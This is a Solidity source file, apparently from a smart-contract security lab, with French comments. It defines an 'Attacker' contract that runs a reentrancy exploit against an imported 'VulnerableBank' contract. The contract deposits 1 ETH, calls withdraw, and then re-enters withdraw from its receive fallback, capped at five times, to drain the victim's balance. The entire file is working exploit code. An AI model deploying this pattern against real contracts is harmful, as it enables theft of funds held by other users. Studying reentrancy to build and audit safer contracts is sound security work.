// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }

    // Déclenche l'attaque
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    // fallback appelé à chaque réception d'ETH
    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            target.withdraw(); // RE-ENTRE dans la victime !
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}